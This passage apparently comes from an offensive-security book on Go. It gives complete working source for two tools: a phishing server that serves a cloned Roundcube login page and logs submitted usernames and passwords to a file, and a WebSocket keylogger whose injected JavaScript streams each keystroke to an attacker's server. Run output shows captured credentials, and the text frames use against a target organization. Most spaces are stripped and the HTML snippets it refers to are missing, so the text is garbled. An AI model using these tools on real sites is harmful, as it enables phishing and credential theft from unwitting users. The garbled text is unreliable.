$tree
.
+--main.go
+--public
+--index.html
+--index_files
+--app.js
+--common.js
+--jquery-ui-1.10.4.custom.css
+--jquery-ui-1.10.4.custom.min.js
+--jquery.min.js
+--jstz.min.js
+--roundcube_logo.png
+--styles.css
+--ui.js
index.html
Listing4-7:Directorylistingfor/ch-4/credential_harvester/
Thefilesinthepublicdirectoryrepresenttheunaltered
clonedloginsite.You’llneedtomodifytheoriginallogin
formtoredirecttheenteredcredentials,sendingthemto
yourselfinsteadofthelegitimateserver.Tobegin,open
public/index.htmlandfindtheformelementusedtoPOSTthe
loginrequest.Itshouldlooksomethinglikethefollowing:
Youneedtomodifytheactionattributeofthistagandpoint
ittoyourserver.Changeactionto/login.Don’tforgettosaveit.
Thelineshouldnowlooklikethefollowing:
Torendertheloginformcorrectlyandcaptureausername
andpassword,you’llfirstneedtoservethefilesinthepublic
directory.Thenyou’llneedtowriteaHandleFuncfor/loginto
capturetheusernameandpassword.You’llalsowanttostore
thecapturedcredentialsinafilewithsomeverboselogging.
Youcanhandleallofthisinjustafewdozenlinesofcode.
Listing4-8showstheprograminitsentirety.
packagemain
import(
"net/http"
"os"
"time"
log"github.com/Sirupsen/logrus"❶
"github.com/gorilla/mux"
)
funclogin(whttp.ResponseWriter,r*http.Request){
log.WithFields(log.Fields{❷
"time":time.Now().String(),
"username":r.FormValue("_user"),❸
"password":r.FormValue("_pass"),❹
"user-agent":r.UserAgent(),
"ip_address":r.RemoteAddr,
}).Info("loginattempt")
http.Redirect(w,r,"/",302)
}
funcmain(){
fh,err:=os.OpenFile("credentials.txt",
os.O_CREATE|os.O_APPEND|os.O_WRONLY,0600)❺
iferr!=nil{
panic(err)
}
deferfh.Close()
log.SetOutput(fh)❻
r:=mux.NewRouter()
r.HandleFunc("/login",login).Methods("POST")❼
r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))❽
log.Fatal(http.ListenAndServe(":8080",r))
}
Listing4-8:Credential-harvestingserver(/ch-4/credential_harvester/main.go)
Thefirstthingworthnotingisyouimport
github.com/Sirupsen/logrus❶.Thisisastructuredloggingpackage
thatweprefertouseinsteadofthestandardGologpackage.It
providesmoreconfigurableloggingoptionsforbettererror
handling.Tousethispackage,you’llneedtomakesureyou
rangogetbeforehand.
Next,youdefinethelogin()handlerfunction.Hopefully,this
patternlooksfamiliar.Insidethisfunction,youuse
log.WithFields()towriteoutyourcaptureddata❷.Youdisplay
thecurrenttime,theuser-agent,andIPaddressofthe
requester.YoualsocallFormValue(string)tocaptureboththe
username(_user)❸andpassword(_pass)❹valuesthatwere
submitted.Yougetthesevaluesfromindex.htmlandby
locatingtheforminputelementsforeachusernameand
password.Yourserverneedstoexplicitlyalignwiththenames
ofthefieldsastheyexistintheloginform.
Thefollowingsnippet,extractedfromindex.html,shows
therelevantinputitems,withtheelementnamesinboldfor
clarity:
Inyourmain()function,youbeginbyopeningafilethat’ll
beusedtostoreyourcaptureddata❺.Then,youuse
log.SetOutput(io.Writer),passingitthefilehandleyoujustcreated,
toconfiguretheloggingpackagesothatit’llwriteitsoutputto
thatfile❻.Next,youcreateanewrouterandmountthelogin()
handlerfunction❼.
Priortostartingtheserver,youdoonemorethingthatmay
lookunfamiliar:youtellyourroutertoservestaticfilesfroma
directory❽.Thatway,yourGoserverexplicitlyknowswhere
yourstaticfiles—images,JavaScript,HTML—live.Gomakes
thiseasy,andprovidesprotectionsagainstdirectorytraversal
attacks.Startingfromtheinsideout,youusehttp.Dir(string)to
definethedirectoryfromwhichyouwishtoservethefiles.
Theresultofthisispassedasinputtohttp.FileServer(FileSystem),
whichcreatesanhttp.Handlerforyourdirectory.You’llmount
thistoyourrouterbyusingPathPrefix(string).Using/asapath
prefixwillmatchanyrequestthathasn’talreadyfounda
match.Notethat,bydefault,thehandlerreturnedfrom
FileServerdoessupportdirectoryindexing.Thiscouldleaksome
information.It’spossibletodisablethis,butwewon’tcover
thathere.
Finally,asyouhavebefore,youstarttheserver.Once
you’vebuiltandexecutedthecodeinListing4-8,openyour
webbrowserandnavigatetohttp://localhost:8080.Try
submittingausernameandpasswordtotheform.Thenhead
backtotheterminal,exittheprogram,andviewthe
credentials.txtfile,shownhere:
$gobuild-ocredential_harvester
$./credential_harvester
^C
$catcredentials.txt
INFO[0038]loginattempt
ip_address="127.0.0.1:34040"password="p@ssw0rd1!"time="2020-02-13
21:29:37.048572849-0800PST"user-agent="Mozilla/5.0(X11;Ubuntu;Linux
x86_64;
rv:51.0)Gecko/20100101Firefox/51.0"username=bob
Lookatthoselogs!Youcanseethatyousubmittedthe
usernameofbobandthepasswordofp@ssw0rd1!.Your
maliciousserversuccessfullyhandledtheformPOSTrequest,
capturedtheenteredcredentials,andsavedthemtoafilefor
offlineviewing.Asanattacker,youcouldthenattempttouse
thesecredentialsagainstthetargetorganizationandproceed
withfurthercompromise.
Inthenextsection,you’llworkthroughavariationofthis
credential-harvestingtechnique.Insteadofwaitingforform
submission,you’llcreateakeyloggertocapturekeystrokesin
realtime.
KEYLOGGINGWITHTHE
WEBSOCKETAPI
TheWebSocketAPI(WebSockets),afullduplexprotocol,has
increasedinpopularityovertheyearsandmanybrowsersnow
supportit.Itprovidesawayforwebapplicationserversand
clientstoefficientlycommunicatewitheachother.Most
importantly,itallowstheservertosendmessagestoaclient
withouttheneedforpolling.
WebSocketsareusefulforbuilding“real-time”
applications,suchaschatandgames,butyoucanusethemfor
nefariouspurposesaswell,suchasinjectingakeyloggerinto
anapplicationtocaptureeverykeyauserpresses.Tobegin,
imagineyou’veidentifiedanapplicationthatisvulnerableto
cross-sitescripting(aflawthroughwhichathirdpartycanrun
arbitraryJavaScriptinavictim’sbrowser)oryou’ve
compromisedawebserver,allowingyoutomodifythe
applicationsourcecode.Eitherscenarioshouldletyouinclude
aremoteJavaScriptfile.You’llbuildtheserverinfrastructure
tohandleaWebSocketconnectionfromaclientandhandle
incomingkeystrokes.
Fordemonstrationpurposes,you’lluseJSBin
(http://jsbin.com)totestyourpayload.JSBinisanonline
playgroundwheredeveloperscantesttheirHTMLand
JavaScriptcode.NavigatetoJSBininyourwebbrowserand
pastethefollowingHTMLintothecolumnontheleft,
completelyreplacingthedefaultcode:
Login
Ontherightsideofthescreen,you’llseetherendered
form.Asyoumayhavenoticed,you’veincludedascripttag
withthesrcattributesettohttp://localhost:8080/k.js.Thisisgoingto
betheJavaScriptcodethatwillcreatetheWebSocket
connectionandsenduserinputtotheserver.
Yourserverisgoingtoneedtodotwothings:handlethe
WebSocketandservetheJavaScriptfile.First,let’sgetthe
JavaScriptoutoftheway,sinceafterall,thisbookisabout
Go,notJavaScript.(Checkout
https://github.com/gopherjs/gopherjs/forinstructionson
writingJavaScriptwithGo.)TheJavaScriptcodeisshown
here:
(function(){
varconn=newWebSocket("ws://{{.}}/ws");
document.onkeypress=keypress;
functionkeypress(evt){
s=String.fromCharCode(evt.which);
conn.send(s);
}
})();
TheJavaScriptcodehandleskeypressevents.Eachtimea
keyispressed,thecodesendsthekeystrokesovera
WebSockettoaresourceatws://{{.}}/ws.Recallthatthe{{.}}
valueisaGotemplateplaceholderrepresentingthecurrent
context.ThisresourcerepresentsaWebSocketURLthatwill
populatetheserverlocationinformationbasedonastring
you’llpasstothetemplate.We’llgettothatinaminute.For
thisexample,you’llsavetheJavaScriptinafilenamed
logger.js.
Butwait,yousay,wesaidwewereservingitask.js!The
HTMLweshowedpreviouslyalsoexplicitlyusesk.js.What
gives?Well,logger.jsisaGotemplate,notanactual
JavaScriptfile.You’llusek.jsasyourpatterntomatchagainst
inyourrouter.Whenitmatches,yourserverwillrenderthe
templatestoredinthelogger.jsfile,completewithcontextual
datathatrepresentsthehosttowhichyourWebSocket
connects.Youcanseehowthisworksbylookingattheserver
code,showninListing4-9.
import(
"flag"
"fmt"
"html/template"
"log"
"net/http"
"github.com/gorilla/mux"
❶"github.com/gorilla/websocket"
)
var(
❷upgrader=websocket.Upgrader{
CheckOrigin:func(r*http.Request)bool{returntrue},
}
listenAddrstring
wsAddrstring
jsTemplate*template.Template
)
funcinit(){
flag.StringVar(&listenAddr,"listen-addr","","Addresstolistenon")
flag.StringVar(&wsAddr,"ws-addr","","AddressforWebSocketconnection")
flag.Parse()
varerrerror
❸jsTemplate,err=template.ParseFiles("logger.js")
iferr!=nil{
panic(err)
}
}
funcserveWS(whttp.ResponseWriter,r*http.Request){
❹conn,err:=upgrader.Upgrade(w,r,nil)
iferr!=nil{
http.Error(w,"",500)
return
}
deferconn.Close()
fmt.Printf("Connectionfrom%s\n",conn.RemoteAddr().String())
for{
❺_,msg,err:=conn.ReadMessage()
iferr!=nil{
return
}
❻fmt.Printf("From%s:%s\n",conn.RemoteAddr().String(),string(msg))
}
}
funcserveFile(whttp.ResponseWriter,r*http.Request){
❼w.Header().Set("Content-Type","application/javascript")
❽jsTemplate.Execute(w,wsAddr)
}
funcmain(){
r:=mux.NewRouter()
❾r.HandleFunc("/ws",serveWS)
❿r.HandleFunc("/k.js",serveFile)
log.Fatal(http.ListenAndServe(":8080",r))
}
Listing4-9:Keyloggingserver(/ch-4/websocket_keylogger/main.go)
Wehavealottocoverhere.First,notethatyou’reusing
anotherthird-partypackage,gorilla/websocket,tohandleyour
WebSocketcommunications❶.Thisisafull-featured,
powerfulpackagethatsimplifiesyourdevelopmentprocess,
likethegorilla/muxrouteryouusedearlierinthischapter.Don’t
forgettorungogetgithub.com/gorilla/websocketfromyourterminal
first.
Youthendefineseveralvariables.Youcreatea
websocket.Upgraderinstancethat’llessentiallywhitelistevery
origin❷.It’stypicallybadsecuritypracticetoallowall
origins,butinthiscase,we’llrollwithitsincethisisatest
instancewe’llrunonourlocalworkstations.Foruseinan
actualmaliciousdeployment,you’dlikelywanttolimitthe
origintoanexplicitvalue.
Withinyourinit()function,whichexecutesautomatically
beforemain(),youdefineyourcommandlineargumentsand
attempttoparseyourGotemplatestoredinthelogger.jsfile.
Noticethatyou’recallingtemplate.ParseFiles("logger.js")❸.You
checktheresponsetomakesurethefileparsedcorrectly.Ifall
issuccessful,youhaveyourparsedtemplatestoredina
variablenamedjsTemplate.
Atthispoint,youhaven’tprovidedanycontextualdatato
yourtemplateorexecutedit.That’llhappenshortly.First,
however,youdefineafunctionnamedserveWS()thatyou’lluse
tohandleyourWebSocketcommunications.Youcreateanew
websocket.Conninstancebycallingupgrader.Upgrade(http.ResponseWriter,
*http.Request,http.Header)❹.TheUpgrade()methodupgradesthe
HTTPconnectiontousetheWebSocketprotocol.Thatmeans
thatanyrequesthandledbythisfunctionwillbeupgradedto
useWebSockets.Youinteractwiththeconnectionwithinan
infiniteforloop,callingconn.ReadMessage()toreadincoming
messages❺.IfyourJavaScriptworksappropriately,these
messagesshouldconsistofcapturedkeystrokes.Youwrite
thesemessagesandtheclient’sremoteIPaddresstostdout❻.
You’vetackledarguablythehardestpieceofthepuzzlein
creatingyourWebSockethandler.Next,youcreateanother
handlerfunctionnamedserveFile().Thisfunctionwillretrieve
andreturnthecontentsofyourJavaScripttemplate,complete
withcontextualdataincluded.Todothis,yousettheContent-
Typeheaderasapplication/javascript❼.Thiswilltellconnecting
browsersthatthecontentsoftheHTTPresponsebodyshould
betreatedasJavaScript.Inthesecondandlastlineofthe
handlerfunction,youcalljsTemplate.Execute(w,wsAddr)❽.
Rememberhowyouparsedlogger.jswhileyouwere
bootstrappingyourserverintheinit()function?Youstoredthe
resultwithinthevariablenamedjsTemplate.Thislineofcode
processesthattemplate.Youpasstoitanio.Writer(inthiscase,
you’reusingw,anhttp.ResponseWriter)andyourcontextualdataof
typeinterface{}.Theinterface{}typemeansthatyoucanpassany
typeofvariable,whetherthey’restrings,structs,orsomething
else.Inthiscase,you’repassingastringvariablenamed
wsAddr.Ifyoujumpbackuptotheinit()function,you’llseethat
thisvariablecontainstheaddressofyourWebSocketserver
andissetviaacommandlineargument.Inshort,itpopulates
thetemplatewithdataandwritesitasanHTTPresponse.
Prettyslick!
You’veimplementedyourhandlerfunctions,serveFile()and
serveWS().Now,youjustneedtoconfigureyourrouterto
performpatternmatchingsothatyoucanpassexecutiontothe
appropriatehandler.Youdothis,muchasyouhave
previously,inyourmain()function.Thefirstofyourtwo
handlerfunctionsmatchesthe/wsURLpattern,executingyour
serveWS()functiontoupgradeandhandleWebSocket
connections❾.Thesecondroutematchesthepattern/k.js,
executingtheserveFile()functionasaresult❿.Thisishowyour
serverpushesarenderedJavaScripttemplatetotheclient.
Let’sfireuptheserver.IfyouopentheHTMLfile,you
shouldseeamessagethatreadsconnectionestablished.Thisis
loggedbecauseyourJavaScriptfilehasbeenrenderedinthe
browserandrequestedaWebSocketconnection.Ifyouenter
credentialsintotheformelements,youshouldseethem
printedtostdoutontheserver:
$gorunmain.go-listen-addr=127.0.0.1:8080-ws-addr=127.0.0.1:8080
Connectionfrom127.0.0.1:58438
From127.0.0.1:58438:u
From127.0.0.1:58438:s
From127.0.0.1:58438:e
From127.0.0.1:58438:r
From127.0.0.1:58438:
From127.0.0.1:58438:p
From127.0.0.1:58438:@
From127.0.0.1:58438:s
From127.0.0.1:58438:s
From127.0.0.1:58438:w
From127.0.0.1:58438:o
From127.0.0.1:58438:r
From127.0.0.1:58438:d
Youdidit!Itworks!Youroutputlistseachindividual
keystrokethatwaspressedwhenfillingouttheloginform.In
thiscase,it’sasetofusercredentials.Ifyou’rehavingissues,
makesureyou’resupplyingaccurateaddressesascommand
linearguments.Also,theHTMLfileitselfmayneedtweaking
ifyou’reattemptingtocallk.jsfromaserverotherthan
localhost:8080.
Youcouldimprovethiscodeinseveralways.Forone,you
mightwanttologtheoutputtoafileorotherpersistent
storage,ratherthantoyourterminal.Thiswouldmakeyou
lesslikelytoloseyourdataiftheterminalwindowclosesor
theserverreboots.Also,ifyourkeyloggerlogsthekeystrokes
ofmultipleclientssimultaneously,theoutputwillmixthe
data,makingitpotentiallydifficulttopiecetogetheraspecific
user’scredentials.Youcouldavoidthisbyfindingabetter
presentationformatthat,forexample,groupskeystrokesby
uniqueclient/portsource.
Yourjourneythroughcredentialharvestingiscomplete.